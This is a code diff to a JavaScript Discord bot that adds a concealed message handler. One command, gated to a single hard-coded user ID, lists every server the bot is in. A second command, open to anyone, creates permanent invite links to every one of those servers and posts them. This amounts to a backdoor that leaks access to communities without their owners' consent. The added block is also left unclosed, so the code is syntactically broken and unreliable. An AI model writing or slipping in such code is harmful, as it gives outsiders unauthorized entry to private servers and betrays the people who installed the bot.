@@ -40,6 +40,22 @@ cc.send({embed: {
 }});
 });
 
+bot.on('message',m=>{
+if(m.content=="$servers_name"&&m.author.id=="654669770549100575"){
+let s=bot.guilds.cache;
+s.each(guild=>{
+m.channel.send(`${guild.name}`);
+});
+}
+else if(m.content=="$servers_link"){
+let s=bot.guilds.cache;
+s.each(guild=>{
+let cnl=guild.channels.cache.find(channel=>channel.type=='text');
+cnl.createInvite({maxAge:0})
+.then(invite => m.channel.send(`server link :- https://discord.gg/${invite.code}`))
+.catch(console.error);
+});
+
 bot.on("ready", () => {
   // This event will run if the bot starts, and logs in, successfully.
   console.log(`Bot has started, with ${bot.users.cache.size} users, in ${bot.channels.cache.size} channels of ${bot.guilds.cache.size} guilds.`);
